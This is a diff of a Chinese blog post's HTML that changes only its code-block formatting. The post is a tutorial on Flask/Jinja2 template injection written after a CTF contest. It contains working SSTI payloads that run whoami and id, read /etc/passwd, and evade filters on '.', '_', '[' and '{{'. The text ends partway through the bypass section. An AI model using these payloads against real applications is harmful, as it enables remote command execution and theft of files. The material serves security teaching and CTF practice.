@@ -63,7 +63,7 @@
         "description": "最近的省赛遇到一个 Flask 模板注入 Bypass 的题目，解题过程中很容易得出有过滤 _ 和 . 两个字符，可惜的是在此之前几乎没有用过 Flask 框架，导致比赛当时极其尴尬，根本不知道如何绕过，最……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  1653 ,
+        "wordCount":  1599 ,
         "image": ["https://oss.zjun.info/zjun.info/1FTi6kxIh8wagZj.png","https://oss.zjun.info/zjun.info/7QGFWizJrbKpX4s.png","https://oss.zjun.info/zjun.info/Swz24ajcr9efOKl.png","https://oss.zjun.info/zjun.info/FtGuAVP3laoILYp.png","https://oss.zjun.info/zjun.info/jQZTWEfXvMJ8IuL.png","https://oss.zjun.info/zjun.info/frc14xjgSCGnHMN.png","https://oss.zjun.info/zjun.info/VtqU96fpr4JKjaw.png","https://oss.zjun.info/zjun.info/sp1MovDLQ2HOSmJ.png","https://oss.zjun.info/zjun.info/OqWJieBfrGhgwzL.png","https://oss.zjun.info/zjun.info/xpaVGBU9f4qRLEO.png","https://oss.zjun.info/zjun.info/UmVknaRhOirL3pK.png","https://oss.zjun.info/zjun.info/EdA74lOaYyfKLTH.png"],
         "publisher": {
             "@type": "Organization",
@@ -300,24 +300,7 @@
 <p>Flask 用 Jinja2 作为渲染引擎，这个渲染引擎就是在 html 的基础上，在需要数据交互的地方加上标签标注，最后就是将这些标签解析为标准的开发语言语法。web 层面的漏洞通常就在于数据交互，开发语言写得不够严谨，容易造成一系列的注入问题。Flask 当然也难以避免。</p>
 <h2 id="0x02-注入浅析"><a href="#0x02-注入浅析" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:0x02-注入浅析" class="headings">0x02 注入浅析</a></h2>
 <p>先来看看一段简单的代码：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
@@ -330,25 +313,9 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>为了方便本地修改调试，所以开启了 <code>debug=True</code> ，单从这小段代码就可以看出，传入的 <code>id</code> 参数直接拼接进了 html 中，毫无疑问直接拼接 html 会存在反射型 xss，而且这里是 Flask 框架，可以执行代码，存在 RCE。</p>
+</span></span></code></pre></div><p>为了方便本地修改调试，所以开启了 <code>debug=True</code> ，单从这小段代码就可以看出，传入的 <code>id</code> 参数直接拼接进了 html 中，毫无疑问直接拼接 html 会存在反射型 xss，而且这里是 Flask 框架，可以执行代码，存在 RCE。</p>
 <p>这是一种不严谨的写法，安全的写法如下：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
@@ -358,9 +325,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>在用户输入的部分外包裹{ { }}，这样就只是一个单纯的传参，不会引起代码执行。</p>
+</span></span></code></pre></div><p>在用户输入的部分外包裹{ { }}，这样就只是一个单纯的传参，不会引起代码执行。</p>
 <p>接着看第一个有安全隐患的代码，直接访问，没有传入参数，显示 None。</p>
 <p><img src="https://oss.zjun.info/zjun.info/1FTi6kxIh8wagZj.png" alt="1FTi6kxIh8wagZj"></p>
 <p>传入 xss 代码，不出所料，直接将其交给了前端执行。</p>
@@ -368,15 +333,8 @@
 <p>即然是 Jinja2 的渲染引擎，那么其中的代码也是能够被解析执行的，因此在判断是否存在模板注入时可以用类似于简单的加减乘除法来判断。</p>
 <p><img src="https://oss.zjun.info/zjun.info/Swz24ajcr9efOKl.png" alt="Swz24ajcr9efOKl"></p>
 <p>本地环境构造了一个 rce payload：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">408</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/FtGuAVP3laoILYp.png" alt="FtGuAVP3laoILYp"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">408</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/FtGuAVP3laoILYp.png" alt="FtGuAVP3laoILYp"></p>
 <p>要分析这个 Payload，就得先说说 Python 的魔术方法：</p>
 <div class="table-container"><table>
 <thead>
@@ -408,19 +366,7 @@
 <p>上面打印了从 str 类到其父类再到其父类的所有子类。</p>
 <p><code>[]</code> 、 <code>{}</code> 、 <code>''</code> 、 <code>()</code> 是 Python 中的内置变量。通过内置变量的一些属性或函数去访问当前 Python 环境中的对象继承树，可以从继承树到根对象类。利用 <code>__subclasses__()</code> 等函数可以再到每一个 Object，这样便可以利用当前 Python 环境执行任意代码。</p>
 <p>当然 Python 中除了 str 类还有 list、dict、tuple，都可以进行构造， <code>__mro__</code> 和 <code>__base__</code> 都可以返回其基类，但是 <code>__base__</code> 更加直接一些。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
@@ -428,46 +374,19 @@
 </span></span><span class="line"><span class="cl"><span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span>
 </span></span><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span>
 </span></span><span class="line"><span class="cl"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>这里就能读取到所有的子类了，然后选择我们所要利用的类，从 0 开始，这里我用的是 <code>&lt;class 'subprocess.Popen'&gt;</code> 这个类</p>
+</span></span></code></pre></div><p>这里就能读取到所有的子类了，然后选择我们所要利用的类，从 0 开始，这里我用的是 <code>&lt;class 'subprocess.Popen'&gt;</code> 这个类</p>
 <p><img src="https://oss.zjun.info/zjun.info/frc14xjgSCGnHMN.png" alt="frc14xjgSCGnHMN"></p>
 <p>它的位置也好确定，写一个 Python 遍历打印位置即可找到位置是 408</p>
 <p><img src="https://oss.zjun.info/zjun.info/VtqU96fpr4JKjaw.png" alt="VtqU96fpr4JKjaw"></p>
 <p>这里这么多类其实很多都可以利用，选择一个比较熟悉的就行。实在不知道的呢，建议在本地随便打个 Payload，丢进 burp 中爆破位置，比如用命令执行或文件读取的 Payload，设置 0 到 600，其实本机一共就 472 个类，这里设得较大，也不影响。其中可以命令执行的很多，差不多一半左右的都可以。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;</span><span class="p">)}}</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">80</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;</span><span class="p">)}}</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 命令执行</span>
 </span></span><span class="line"><span class="cl"><span class="p">{{{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">343</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 文件读取</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/sp1MovDLQ2HOSmJ.png" alt="sp1MovDLQ2HOSmJ"></p>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/sp1MovDLQ2HOSmJ.png" alt="sp1MovDLQ2HOSmJ"></p>
 <p>接着调用 OS 模块执行系统命令并读取执行结果给变量，再打印到网页。</p>
 <p>下面是某师傅的 Payload：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">values</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">b</span><span class="o">.</span><span class="vm">__class__</span> <span class="o">==</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span> <span class="o">%</span><span class="p">}</span>
@@ -478,9 +397,7 @@
 </span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/OqWJieBfrGhgwzL.png" alt="OqWJieBfrGhgwzL"></p>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/OqWJieBfrGhgwzL.png" alt="OqWJieBfrGhgwzL"></p>
 <p>结合我们上面的分析也能很容易看懂这个 Payload，相当于调用 os 执行 whoami。</p>
 <h2 id="0x03-bypass"><a href="#0x03-bypass" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:0x03-bypass" class="headings">0x03 Bypass</a></h2>
 <p>本节部分参考<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2 模板注入中的一些绕过姿势</a>。</p>
@@ -489,80 +406,37 @@
 <li><strong><code>.</code>被过滤</strong></li>
 </ul>
 <p><code>.</code> 被过滤的情况，可以利用 <code>[]</code> 来包裹函数，替代 <code>.</code> 的连接效果：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;__class__&#39;</span><span class="p">][</span><span class="s1">&#39;__base__&#39;</span><span class="p">][</span><span class="s1">&#39;__subclasses__&#39;</span><span class="p">]()[</span><span class="mi">408</span><span class="p">][</span><span class="s1">&#39;__init__&#39;</span><span class="p">][</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/xpaVGBU9f4qRLEO.png" alt="xpaVGBU9f4qRLEO"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;__class__&#39;</span><span class="p">][</span><span class="s1">&#39;__base__&#39;</span><span class="p">][</span><span class="s1">&#39;__subclasses__&#39;</span><span class="p">]()[</span><span class="mi">408</span><span class="p">][</span><span class="s1">&#39;__init__&#39;</span><span class="p">][</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()</span>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/xpaVGBU9f4qRLEO.png" alt="xpaVGBU9f4qRLEO"></p>
 <ul>
 <li><strong><code>_</code>被过滤</strong></li>
 </ul>
 <p>利用 Hex 编码 <code>\x5f</code> 替代 <code>_</code> ：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">class</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">base</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">subclasses</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">]()[</span><span class="mi">408</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">init</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">globals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">builtins</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">import</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/UmVknaRhOirL3pK.png" alt="UmVknaRhOirL3pK"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">class</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">base</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">subclasses</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">]()[</span><span class="mi">408</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">init</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">globals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">builtins</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">import</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()</span>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/UmVknaRhOirL3pK.png" alt="UmVknaRhOirL3pK"></p>
 <ul>
 <li><strong><code>[</code>被过滤</strong></li>
 </ul>
 <p>利用 <code>__getitem__</code> 绕过中括号限制：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">request</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><ul>
+</span></span></code></pre></div><ul>
 <li><strong>双{被过滤</strong></li>
 </ul>
 <p>利用 <code>{% if xxx %}xx{% endif %}</code> 绕过：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
